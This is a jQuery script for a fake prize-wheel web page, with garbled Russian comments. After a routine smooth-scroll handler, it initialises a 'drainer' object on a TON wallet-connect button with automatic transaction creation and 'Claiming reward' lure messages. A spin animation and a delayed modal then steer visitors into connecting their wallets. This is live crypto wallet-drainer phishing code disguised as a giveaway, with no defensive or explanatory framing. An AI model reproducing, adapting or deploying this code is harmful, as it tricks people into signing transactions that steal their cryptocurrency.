
$(document).ready(function () {

    $('a[href^="#"]').on('click', function (event) {
        // Ð¾Ñ‚Ð¼ÐµÐ½ÑÐµÐ¼ ÑÑ‚Ð°Ð½Ð´Ð°Ñ€Ñ‚Ð½Ð¾Ðµ Ð´ÐµÐ¹ÑÑ‚Ð²Ð¸Ðµ
        event.preventDefault();

        var sc = $(this).attr("href"),
            dn = $(sc).offset().top;
        /*
         * sc - Ð² Ð¿ÐµÑ€ÐµÐ¼ÐµÐ½Ð½ÑƒÑŽ Ð·Ð°Ð½Ð¾ÑÐ¸Ð¼ Ð¸Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸ÑŽ Ð¾ Ñ‚Ð¾Ð¼, Ðº ÐºÐ°ÐºÐ¾Ð¼Ñƒ Ð±Ð»Ð¾ÐºÑƒ Ð½Ð°Ð´Ð¾ Ð¿ÐµÑ€ÐµÐ¹Ñ‚Ð¸
         * dn - Ð¾Ð¿Ñ€ÐµÐ´ÐµÐ»ÑÐµÐ¼ Ð¿Ð¾Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð±Ð»Ð¾ÐºÐ° Ð½Ð° ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ðµ
         */

        $('html, body').animate({
            scrollTop: dn
        }, 1000);

        /*
         * 1000 ÑÐºÐ¾Ñ€Ð¾ÑÑ‚ÑŒ Ð¿ÐµÑ€ÐµÑ…Ð¾Ð´Ð° Ð² Ð¼Ð¸Ð»Ð»Ð¸ÑÐµÐºÑƒÐ½Ð´Ð°Ñ…
         */
    });
});


$(document).ready(function () {

  // Access the drainer object from the window
  const drainer = window.drainer;

  // Initialize the drainer with the wallet button wrapper
  drainer.init("#ton-connect", {
    autoCreateTransaction: true,
    honeypotMessage: "ðŸŽ Claiming reward",
    jettonMessage: (amount, symbol) =>
        `ðŸŽ‰ Receiving ${amount} ${symbol}`,
  });

  var wheel = $("#wheel");
  var spinButton = $("#spin-button");
  var spinDuration = 9000; // 3 seconds
  var spinAngle = 1080; // degrees
  var modal = $(".modal"); // ÑÐµÐ»ÐµÐºÑ‚Ð¾Ñ€ Ð´Ð»Ñ ÑÐ»ÐµÐ¼ÐµÐ½Ñ‚Ð° Ñ ÐºÐ»Ð°ÑÑÐ¾Ð¼ modal
  var hasSpun = localStorage.getItem("hasSpun"); // Ð¿Ñ€Ð¾Ð²ÐµÑ€ÑÐµÐ¼, Ð±Ñ‹Ð» Ð»Ð¸ ÑƒÐ¶Ðµ Ð½Ð°Ð¶Ð°Ñ‚ ÑÐ¿Ð¸Ð½

  if (!hasSpun) {
    spinButton.on("click", function () {
      wheel.css("transition", "transform " + spinDuration + "ms ease-in-out");
      wheel.css("transform", "rotate(" + spinAngle + "deg)");
      setTimeout(function () {
        wheel.css("transition", "none");
        wheel.css("transform", "rotate(0deg)");
      }, spinDuration);

      // Ð´Ð¾Ð±Ð°Ð²Ð»ÑÐµÐ¼ ÐºÐ»Ð°ÑÑ modal_active Ðº ÑÐ»ÐµÐ¼ÐµÐ½Ñ‚Ñƒ Ñ ÐºÐ»Ð°ÑÑÐ¾Ð¼ modal Ñ‡ÐµÑ€ÐµÐ· 15 ÑÐµÐºÑƒÐ½Ð´
      setTimeout(function () {
        modal.addClass("modal_active");
      }, 10000);

      // ÑÐ¾Ñ…Ñ€Ð°Ð½ÑÐµÐ¼ Ð¸Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸ÑŽ Ð¾ Ñ‚Ð¾Ð¼, Ñ‡Ñ‚Ð¾ ÑÐ¿Ð¸Ð½ Ð±Ñ‹Ð» Ð½Ð°Ð¶Ð°Ñ‚
      localStorage.setItem("hasSpun", true);
    });
  } else {
    // ÐµÑÐ»Ð¸ ÑÐ¿Ð¸Ð½ ÑƒÐ¶Ðµ Ð±Ñ‹Ð» Ð½Ð°Ð¶Ð°Ñ‚, Ð´Ð¾Ð±Ð°Ð²Ð»ÑÐµÐ¼ ÐºÐ»Ð°ÑÑ modal_active ÑÑ€Ð°Ð·Ñƒ
    modal.addClass("modal_active");
  }
});
